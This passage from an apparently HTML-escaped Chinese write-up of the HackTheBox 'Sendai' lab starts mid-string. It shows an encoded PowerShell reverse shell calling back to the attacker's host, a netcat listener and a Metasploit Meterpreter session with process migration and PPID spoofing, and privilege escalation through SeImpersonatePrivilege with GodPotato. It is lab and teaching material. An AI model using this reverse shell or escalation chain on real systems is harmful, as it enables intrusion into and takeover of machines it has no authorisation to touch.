JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nc -lnvp &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connect to &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;10.10.16.23&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; from &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;10.129.234.66&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57968&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sendai&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\W&lt;/span&gt;indows&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;shell加强，上线msf,顺便利用msf进程迁移稳定一些&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/handler&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://10.10.16.23:4444
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; https://10.10.16.23:4444 handling request from 10.129.234.66; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UUID: ronoammx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; https://10.10.16.23:4444 handling request from 10.129.234.66; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UUID: ronoammx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Staging x64 payload &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;204892&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; https://10.10.16.23:4444 handling request from 10.129.234.66; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UUID: ronoammx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Session ID &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.16.23:4444 -&amp;gt; 10.129.234.66:58076&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; processing AutoRunScript &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;post/windows/manage/migrate&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Running module against DC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Current server process: shell.exe &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3968&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Spawning notepad.exe process to migrate into
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Spoofing PPID &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Migrating into &lt;span style=&#34;color:#ae81ff&#34;&gt;5208&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully migrated into process &lt;span style=&#34;color:#ae81ff&#34;&gt;5208&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; opened &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.16.23:4444 -&amp;gt; 10.129.234.66:58076&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-09-18 09:26:51 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sessions -i &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting interaction with 1...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;meterpreter &amp;gt; shell
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Process &lt;span style=&#34;color:#ae81ff&#34;&gt;768&lt;/span&gt; created.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Channel &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; created.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Microsoft Windows &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Version 10.0.20348.4052&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Microsoft Corporation. All rights reserved.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;whoami /all
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whoami /all
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USER INFORMATION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Name     SID                                         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=============&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;============================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sendai&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc S-1-5-21-3085872742-570972823-736764132-1104
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GROUP INFORMATION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Group Name                                 Type             SID                                                             Attributes                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==========================================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUILTIN&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUILTIN&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;re-Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt; Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUILTIN&lt;span style=&#34;color:#ae81ff&#34;&gt;\C&lt;/span&gt;ertificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;ERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;uthenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;his Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT SERVICE&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;SSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Mandatory Label&lt;span style=&#34;color:#ae81ff&#34;&gt;\H&lt;/span&gt;igh Mandatory Level       Label            S-1-16-12288                                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PRIVILEGES INFORMATION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Privilege Name                Description                               State   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=============================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=========================================&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;========&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeIncreaseQuotaPrivilege      Adjust memory quotas &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a process        Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeMachineAccountPrivilege     Add workstations to domain                Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeCreateGlobalPrivilege       Create global objects                     Enabled 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USER CLAIMS INFORMATION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User claims unknown.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Kerberos support &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Dynamic Access Control on this device has been disabled.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随便找个土豆提权，搞定&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\G&lt;/span&gt;odPotato-NET4.exe  -cmd &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd /c C:\users\sqlsvc\Documents\shell.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\G&lt;/span&gt;odPotato-NET4.exe  -cmd &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd /c C:\users\sqlsvc\Documents\shell.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CombaseModule: 0x140712362377216
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DispatchTable: 0x140712364964168
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; UseProtseqFunction: 0x140712364257472
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; UseProtseqFunctionParamCount: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; HookRPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Start PipeServer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trigger RPCSS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CreateNamedPipe &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\p&lt;/span&gt;ipe&lt;span style=&#34;color:#ae81ff&#34;&gt;\e&lt;/span&gt;e30b0eb-3444-427c-a150-41c7a1bf125d&lt;span style=&#34;color:#ae81ff&#34;&gt;\p&lt;/span&gt;ipe&lt;span style=&#34;color:#ae81ff&#34;&gt;\e&lt;/span&gt;pmapper
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DCOM obj IPID: 00002002-0660-ffff-b35f-eef0a3c42949
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DCOM obj OXID: 0x535f01d97b4a2461
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DCOM obj OID: 0xeb87aa8a01016c28
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DCOM obj Flags: 0x281
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DCOM obj PublicRefs: 0x0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Marshal Object bytes len: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; UnMarshal Object
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Pipe Connected!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CurrentUser: NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\N&lt;/span&gt;ETWORK SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CurrentsImpersonationLevel: Impersonation
